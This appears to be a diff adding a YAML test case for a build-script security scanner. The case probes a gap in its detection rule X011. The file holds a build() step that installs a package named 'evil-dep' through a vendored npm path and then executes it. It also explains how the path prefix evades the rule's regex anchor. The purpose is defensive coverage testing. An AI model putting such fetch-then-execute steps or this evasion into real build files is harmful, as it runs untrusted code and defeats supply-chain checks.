@@ -1,0 +1,55 @@
+campaign: path-qualified-npm-resolve
+campaign_type: deterministic
+package: harness-baseline
+
+environment:
+  trustsight_version: 0.23.0
+  trustsight_source: local-path
+  db_state: cold
+  flag_threshold: 20
+
+generator:
+  type: inputs
+
+prompt:
+  prompt_id: path-qualified-npm-resolve
+  behavior_goal: fetch_then_execute
+  text: |
+    The npm side of `venv-pip-registry-resolve`: a build step resolves a
+    package from the npm registry through a path-qualified npm and executes
+    what it installed.
+
+        build() {
+          cd "$srcdir/harness-baseline-1.0.0"
+          ./tools/node/bin/npm install evil-dep@1.2.3
+          node node_modules/evil-dep/index.js
+        }
+
+    The anchor is the same one: X011's pattern begins with
+    `(?:\A\s*|[;&|(]\s*|&&\s*|\|\|\s*)` and only tolerates an `_EXEC_WRAPPER`
+    and the interpreter spelling between that anchor and the manager
+    (crossfire/_x09_x16.py:100-108).  A vendored toolchain path puts `/`
+    before `npm`, so `PACKAGE_MANAGER_INSTALL`
+    (config/_defaults_executor.py:168) is never reached.  The coverage
+    accounting shares the anchor - `buildfetch._COMMAND_POSITION` (line 79)
+    composes `_REGISTRY_RESOLVE_RE` from it (lines 81-84) - so
+    `unpinned_build_deps` is not raised either.
+
+    This cell is here rather than in the pip campaign because the archive
+    cell is keyed on the expected rule and the shape, and both ecosystems
+    produce the same `X011[unshaped]` cell: a second cell in one campaign
+    would be recorded as a duplicate.  The manager, the path and the
+    ecosystem differ, so a fix that only teaches X011 to accept a venv pip
+    would leave this one open.
+
+    The control runs the same fetch through the bare manager: `npm install
+    evil-dep@1.2.3` is caught by X011 and raises the dependency gap, so it
+    is fail-closed rather than unflagged.  Its sink is the package's own
+    post-install shell script so the two attempts do not collapse onto one
+    (rule, shape, chain) cell; the fetch spelling is the only difference
+    the measurement turns on.
+  expected_rules:
+  - X011
+  forbidden_techniques: {}
+
+attempts: 2
